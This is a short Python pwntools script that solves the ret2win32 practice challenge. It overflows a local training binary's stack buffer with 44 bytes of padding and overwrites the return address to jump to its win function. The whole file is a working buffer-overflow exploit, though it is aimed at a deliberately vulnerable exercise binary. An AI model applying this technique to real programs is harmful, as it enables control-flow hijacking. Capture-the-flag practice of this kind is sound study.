from pwn import *

p=process("./ret2win32")
p.recv()
p.sendline(b"A"*44 + p32(0x0804862c))
m=p.recv()
print(m)
print(p.recv())
p.close()
